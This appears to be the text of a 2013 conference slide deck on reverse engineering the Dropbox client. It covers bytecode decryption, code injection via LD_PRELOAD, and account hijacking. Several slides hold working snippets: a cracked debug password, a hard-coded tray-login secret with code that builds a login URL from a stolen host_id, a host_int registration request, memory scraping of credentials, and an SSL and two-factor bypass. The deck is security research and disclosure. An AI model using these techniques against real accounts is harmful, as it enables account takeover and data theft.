<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>Looking inside the (Drop) box</p>
    <p>Breaking a 10 billion USD product ;)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 1 / 42</p>
  </div>
  <div class="page">
    <p>About Przemysaw</p>
    <p>I Freelance software developer, Python user</p>
    <p>I Occasional open-source contributor (LIDS, Postfix, PDNS)</p>
    <p>I Reverse engineering freak</p>
    <p>I @czajnick on Twitter</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 2 / 42</p>
  </div>
  <div class="page">
    <p>About Dhiru</p>
    <p>I dhiru@openwall.com</p>
    <p>I JtR, Ettercap and hashkill developer</p>
    <p>I Metasploit and Nmap contributor</p>
    <p>I @DhiruKholia on Twitter</p>
    <p>I https://github.com/kholia</p>
    <p>I &quot;john-users&quot; and &quot;john-dev&quot; mailing lists</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 3 / 42</p>
  </div>
  <div class="page">
    <p>Agenda</p>
    <p>I About Dropbox</p>
    <p>I Existing Work</p>
    <p>I Unpack, decrypt and decompile Dropbox</p>
    <p>I Hijacking Dropbox accounts</p>
    <p>I Bypassing SSL and 2FA</p>
    <p>I Dropbox OSS client</p>
    <p>I DEMO :-)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 4 / 42</p>
  </div>
  <div class="page">
    <p>About Dropbox</p>
    <p>I Leading cloud based file storage service</p>
    <p>I 175 million+ users and growing fast</p>
    <p>I Worth 10 billion USD</p>
    <p>I Runs almost anywhere (no Java crap!)</p>
    <p>I Dropbox client, a modified interpreter running obfuscated Python bytecode</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 5 / 42</p>
  </div>
  <div class="page">
    <p>Existing Work</p>
    <p>I (2012) A Critical Analysis of Dropbox Software Security, Nicolas RUFF and Florian LEDOUX (EADS guys)</p>
    <p>I EADS guys analyzed versions 1.1.x to 1.5.x. Fails for 1.6.x released in November, 2012.</p>
    <p>I Mostly kept the &quot;juicy&quot; bits (like source code) to themselves</p>
    <p>I &quot;dropboxdec&quot; by Hagen Fritsch in 2012, for versions 1.1.x only</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 6 / 42</p>
  </div>
  <div class="page">
    <p>Earlier reversing techniques</p>
    <p>I pyREtic (Rich Smith, Black Hat / DEFCON 2010) doesnt work for reversing Dropbox since co_code (code object attribute, raw bytecode) cant be accessed anymore at the Python layer</p>
    <p>I Replacing .pyc with .py to control execution doesnt work!</p>
    <p>I &quot;Reverse Engineering Python Applications&quot; (WOOT 08 paper, Aaron Portnoy) technique doesnt work for the same reason</p>
    <p>I Dropbox is &quot;challenging&quot; to reverse and existing techniques fail</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 7 / 42</p>
  </div>
  <div class="page">
    <p>Dropbox 1.1.x to 2.3.19</p>
    <p>I (Most) Dropbox clients are written mostly in Python</p>
    <p>I py2exe is used for packaging Windows client</p>
    <p>I Python27.dll (customized version) can be extracted from Dropbox.exe using PE Explorer</p>
    <p>I Dropbox.exe also contains a ZIP of all encrypted PYC files (bytecode)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 8 / 42</p>
  </div>
  <div class="page">
    <p>What about Linux version?</p>
    <p>I bbFreeze is (most likely) used for packaging Linux clients</p>
    <p>I Static linking is used. There is no Python / OpenSSL .so file to extract and analyze in IDA Pro :-(</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 9 / 42</p>
  </div>
  <div class="page">
    <p>Extract encrypted bytecode, &quot;unpacker&quot;</p>
    <p>import zipfile</p>
    <p>fileName = &quot;Dropbox.exe&quot;</p>
    <p>ztype = zipfile.ZIP_DEFLATED</p>
    <p>f = zipfile.PyZipFile(fileName, &quot;r&quot;, ztype)</p>
    <p>f.extractall(&quot;pyc_orig&quot;)</p>
    <p># Works on all versions &amp; all platforms!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 10 / 42</p>
  </div>
  <div class="page">
    <p>Bytecode (.pyc) decryption</p>
    <p>I No human-readable strings in .pyc files - encrypted!</p>
    <p>I .pyc files are simply code objects marshaled (serialized)</p>
    <p>I Analyzed Python27.dll (modified Python interpreter) from the Windows version of Dropbox</p>
    <p>I We found Pythons r_object() (marshal.c) function patched to decrypt code objects upon loading</p>
    <p>I Also .pyc magic number was changed - trivial to fix</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 11 / 42</p>
  </div>
  <div class="page">
    <p>.pyc decryption</p>
    <p>I To decrypt the buffer r_object() calls a separate function inside Python27.dll</p>
    <p>I Why not call this decryption function from outside the DLL?</p>
    <p>I Hard-coded address, as it has no symbol attached</p>
    <p>I Unusual calling ABI, inline ASM saves the day!</p>
    <p>I Slightly tricky due to code objects nested recursively</p>
    <p>I No need at all to analyse the encryption algorithm, keys, etc.</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 12 / 42</p>
  </div>
  <div class="page">
    <p>Opcode Remapping</p>
    <p>I Valid strings, but .pyc files still fail to load</p>
    <p>I CPython is a simple opcode (1 byte long) interpreter</p>
    <p>I ceval.c is mostly a big switch statement inside a loop</p>
    <p>I It was patched to use different opcode values</p>
    <p>I Mapping recovered manually by comparing disassembled DLL with standard ceval.c</p>
    <p>I The most time consuming part - ca. 1 evening ;)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 13 / 42</p>
  </div>
  <div class="page">
    <p>Bytecode decryption on Linux</p>
    <p>I Everything statically linked into a single binary</p>
    <p>I Decryption function inlined into r_object(), we can no longer call it from outside</p>
    <p>I Need to find a more robust approach</p>
    <p>I How about loading .pyc files and serializing them back?</p>
    <p>I How do we gain control flow to load these .pyc files?</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 14 / 42</p>
  </div>
  <div class="page">
    <p>Good, old LD_PRELOAD</p>
    <p>I We can use LD_PRELOAD to inject our C code into dropbox process</p>
    <p>export LD_PRELOAD=libdedrop.so</p>
    <p>I Just override some common C function like strlen() to gain control</p>
    <p>I Can we inject Python code this way?</p>
    <p>I Yeah, we can call PyRun_SimpleString</p>
    <p>I BTW, its official Python C API</p>
    <p>I Look Ma, my Python file running inside a Dropbox binary!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 15 / 42</p>
  </div>
  <div class="page">
    <p>Decryption for FREE!</p>
    <p>I We can use LD_PRELOAD to inject our C code into dropbox process</p>
    <p>I From injected code we can call another un-marshalling function, PyMarshal_ReadLastObjectFromFile</p>
    <p>I It loads (and decrypts!) the code objects from encrypted .pyc file</p>
    <p>I We no longer care about decryption, we get it for free!</p>
    <p>I We still need to remap the opcodes, though!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 16 / 42</p>
  </div>
  <div class="page">
    <p>Solving Opcode Mapping</p>
    <p>I Opcode mapping was recovered manually initially</p>
    <p>I Tedious and not future-proof at all</p>
    <p>I We can NOW recover the mapping in a fully automated way</p>
    <p>I Restored the import functionality in Dropbox</p>
    <p>I all.py exercises &gt; 95% of the opcodes, compile under both interpreters and do simple mapping between two bytecode versions</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 17 / 42</p>
  </div>
  <div class="page">
    <p>Missing co_code at Python layer</p>
    <p>I co_code is not visible to the Python layer</p>
    <p>I Layout of structure hosting co_codes is unknown!</p>
    <p>I Need to find offset of co_code somehow</p>
    <p>I Create new code object with known code string using PyCode_New()</p>
    <p>I Use linear memory scan to locate the offset of the known code stream</p>
    <p>I Problem Solved ;)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 18 / 42</p>
  </div>
  <div class="page">
    <p>Decryption for FREE!</p>
    <p>I The missing part - serializing it back to file</p>
    <p>I Object marshalling was stripped from Dropboxs Python, for good reasons ;)</p>
    <p>I We used PyPys _marshal.py</p>
    <p>I ... and yes, we inject the whole thing into the Dropbox process.</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 19 / 42</p>
  </div>
  <div class="page">
    <p>Decrypting encrypted bytecode</p>
    <p>I Our method is a lot shorter, easier and more reliable than EADS one</p>
    <p>I Around 200 lines of easy C, 350 lines of Python (including marshal code from PyPy)</p>
    <p>I Robust, as we dont even need to deal with decryption ourselves</p>
    <p>I Worked with all versions of Dropbox that we used for testing</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 20 / 42</p>
  </div>
  <div class="page">
    <p>Decompiling decrypted bytecode</p>
    <p>I uncompyle2</p>
    <p>I A Python 2.5, 2.6, 2.7 byte-code decompiler, written in Python 2.7</p>
    <p>I https://github.com/Mysterie/uncompyle2</p>
    <p>I Super easy to use ($ uncompyle2 code.pyc) and it works great!</p>
    <p>I We used https://github.com/wibiti/uncompyle2 since it is a bit more stable!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 21 / 42</p>
  </div>
  <div class="page">
    <p>Interesting code snippets</p>
    <p>IS_DEV_MAGIC = DBDEV and hashlib.md5(DBDEV) .hexdigest().startswith('c3da6009e4')</p>
    <p>I Logging is a &quot;protected&quot; developers-only feature</p>
    <p>I Turning IS_DEV_MAGIC on enables debug mode which results in a lot of logging output</p>
    <p>I It is possible to externally set this DBDEV environment variable</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 22 / 42</p>
  </div>
  <div class="page">
    <p>Cracking partial MD5 hash</p>
    <p>I Wrote JtR plug-in for cracking the partial hash</p>
    <p>I Superjames from #openwall cracked it before our plug-in had a chance</p>
    <p>$ echo -en &quot;a2y6shya&quot; | md5sum c3da6009e40a6f572240b8ea7e814c60</p>
    <p>$ export DBDEV=a2y6shya; dropboxd</p>
    <p>I This results in Dropbox printing debug logs to console I So what? What is interesting about these logs?</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 23 / 42</p>
  </div>
  <div class="page">
    <p>host_id (Key Security Item)</p>
    <p>I Each endpoint registration is associated with a unique, persistent 128-bit secret value called host_id</p>
    <p>I Generated by server during installation. Not affected by password changes!</p>
    <p>I host_id was stored in clear-text (in older versions) in a SQLite database</p>
    <p>I In earlier versions of Dropbox, getting host_id was enough to hijack accounts (Derek Newton)</p>
    <p>I host_id is now stored in encrypted fashion</p>
    <p>I Also, we need host_id and &quot;host_int&quot; these days</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 24 / 42</p>
  </div>
  <div class="page">
    <p>Hijacking accounts using logs!</p>
    <p>I host_id and host_int can be extracted from the DEBUG logs!</p>
    <p>I This method is used in dropbox_creds.rb (Metasploit post module) plug-in to hijack Dropbox accounts.</p>
    <p>https://github.com/rapid7/metasploit-framework/pull/1497</p>
    <p>I Fixed after we reported it to Dropbox guys</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 25 / 42</p>
  </div>
  <div class="page">
    <p>host_id and host_int</p>
    <p>I In addition, host_id can be extracted from $HOME/.dropbox/config.dbx (using tools published by EADS guys)</p>
    <p>I host_id and host_int can also be extracted from memory of the Dropbox process (more on this later)</p>
    <p>I host_int can be &quot;sniffed&quot; from Dropbox LAN sync protocol traffic</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 26 / 42</p>
  </div>
  <div class="page">
    <p>LAN sync protocol + host_int sniffing</p>
    <p>I host_int can be &quot;sniffed&quot; from Dropboxs LAN sync protocol traffic (but this protocol can be disabled by the user)</p>
    <p>I Wrote Ettercap plug-in since Nmap plug-in was broken!</p>
    <p>https://github.com/kholia/ettercap/tree/dropbox</p>
    <p>I $ nmap -p17500 script=broadcast-dropbox-listener script-args=newtargets</p>
    <p>I host_int doesnt seem to change (is it fixed by design?)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 27 / 42</p>
  </div>
  <div class="page">
    <p>Dropbox Tray Login</p>
    <p>I What do I do with host_id and host_int?</p>
    <p>I How does the Dropbox client automagically log in a user to its website from the tray icon?</p>
    <p>I Use the Source, Luke! Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 28 / 42</p>
  </div>
  <div class="page">
    <p>Web link generation</p>
    <p>host_id = ? # required! host_int = ? # required!</p>
    <p>baseurl = &quot;https://www.dropbox.com/tray_login&quot; fixed_secret = &quot;ssKeevie4jeeVie9bEen5baRFin9&quot; now = int(time.time())</p>
    <p>h = hashlib.sha1('%s%s' % (fixed_secret, host_id, now)).hexdigest()</p>
    <p>url = &quot;%s?i=%d&amp;t=%d&amp;v=%s&amp;url=home&amp;cl=en_US&quot; % (baseurl, host_int, now, h)</p>
    <p>print url # :-)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 29 / 42</p>
  </div>
  <div class="page">
    <p>More host_int hacks</p>
    <p>I host_int is received from the Dropbox server at the very start</p>
    <p>I So can we ask the server for it ?</p>
    <p>I Turns out it is &quot;easy&quot; to do so</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 30 / 42</p>
  </div>
  <div class="page">
    <p>Get host_int from server!</p>
    <p>host_id = ? # required!</p>
    <p>ctype = 'application/x-www-form-urlencoded' baseurl = 'https://client10.dropbox.com/' data = &quot;buildno=Dropbox-win-1.7.5&amp;tag=&amp;\</p>
    <p>uuid=123456&amp;server_list=True&amp;\ host_id=%s&amp;hostname=random&quot; % host_id</p>
    <p>headers = {'content-type': ctype} r = requests.post(url + 'register_host',</p>
    <p>data=data, headers=headers) data = json.loads(r.text)</p>
    <p>host_int = data[&quot;host_int&quot;]</p>
    <p># host_id is EVERYTHING in Dropbox world!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 31 / 42</p>
  </div>
  <div class="page">
    <p>Question?</p>
    <p>I You cant sniff Dropbox traffic!</p>
    <p>I So, how did we manage to figure out all these internal API calls?</p>
    <p>I Reading code is &quot;hard&quot;!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 32 / 42</p>
  </div>
  <div class="page">
    <p>Reflective DLL injection / LD_PRELOAD</p>
    <p>I Inject a custom DLL / DSO, patch Python objects and bypass SSL encryption</p>
    <p>I Find SSLSocket objects and patch their read(), write() and send() methods</p>
    <p>I Can also steal host_id, host_int or whatever we want!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 33 / 42</p>
  </div>
  <div class="page">
    <p>Patching &amp; Snooping</p>
    <p># 1. Inject code into Dropbox. # 2. Locate PyRun_SimpleString using dlsym # from within the Dropbox process # 3. Feed the following code to the located # PyRun_SimpleString</p>
    <p>import gc</p>
    <p>objs = gc.get_objects() for obj in objs:</p>
    <p>if hasattr(obj, &quot;host_id&quot;): print obj.host_id</p>
    <p>if hasattr(obj, &quot;host_int&quot;): print obj.host_int</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 34 / 42</p>
  </div>
  <div class="page">
    <p>Dropbox API and bypassing 2FA</p>
    <p>I Bypassed SSL and peeked at traffic to understand the internal API</p>
    <p>I Now it is possible to write an open-source Dropbox client</p>
    <p>I Dropboxs two factor authentication can be bypassed by using this internal API!</p>
    <p>I Inject / Use host_id, bypass 2FA, gain access to Dropboxs website + all data!</p>
    <p>I host_id trumps all other security measures!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 35 / 42</p>
  </div>
  <div class="page">
    <p>Challenges / Future Work</p>
    <p>I &quot;export DBDEV=a2y6shya&quot; trick is patched in 2.0.0 (current stable release). Dropbox guys now check full hash value.</p>
    <p>I SHA-256 hash e27eae61e774b19f4053361e523c771a92e8380 26da42c60e6b097d9cb2bc825</p>
    <p>I Can we break this SHA-256 hash?</p>
    <p>I Can we run from the decompiled &quot;sources&quot;? ;)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 36 / 42</p>
  </div>
  <div class="page">
    <p>DEMO!</p>
    <p>I Get Dropbox</p>
    <p>I Extracting and decompiling bytecode</p>
    <p>I Accounting hijacking (dropbox-jack-v2.py)</p>
    <p>I Dropbox OSS client</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 37 / 42</p>
  </div>
  <div class="page">
    <p>Resources</p>
    <p>I Dropbox OSS PoC client, dedrop, all our source-code!</p>
    <p>https://github.com/kholia/dedrop</p>
    <p>I https://github.com/wibiti/uncompyle2.git</p>
    <p>I https://github.com/kholia/dbx-keygen-linux.git</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 38 / 42</p>
  </div>
  <div class="page">
    <p>Fun Stuff ;)</p>
    <p>I http_authentication.py file contains:</p>
    <p>fak returned, FakeShit realm=&quot;hi&quot;</p>
    <p>NTLM realm=&quot;your mom&quot;, you=&quot;suck&quot;,</p>
    <p>Digest realm=&quot;hi&quot;, Shit&quot;</p>
    <p>I There actually is a file named &quot;ultimatesymlinkresolver.py&quot;</p>
    <p>Cant really say what is so &quot;ultimate&quot; about resolving symlinks ;)</p>
    <p>I Dropbox runs nginx, &quot;nginx/1.2.7&quot;</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 39 / 42</p>
  </div>
  <div class="page">
    <p>Questions &amp; Discussion</p>
    <p>I Are the obfuscation measures helping Dropbox and their users? Is this &quot;arms-race&quot; going to stop?</p>
    <p>I Dhiru Kholia (dhiru@openwall.com)</p>
    <p>I Przemysaw Wegrzyn (pwegrzyn@codepainters.com)</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 40 / 42</p>
  </div>
  <div class="page">
    <p>Thanks!</p>
    <p>I Openwall folks, my colleagues at work, anonymous reviewers and friends for their invaluable feedback and encouragement</p>
    <p>I Hagen Fritsch for showing that automated opcode mapping recovery is possible</p>
    <p>I EADS guys and wibiti for their work on uncompyle2</p>
    <p>I Dropbox for being so awesome!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 41 / 42</p>
  </div>
  <div class="page">
    <p>Thanks!</p>
    <p>Przemysaw Wegrzyn, Dhiru Kholia Looking inside the (Drop) box 2013.08.13 42 / 42</p>
  </div>
</Presentation>
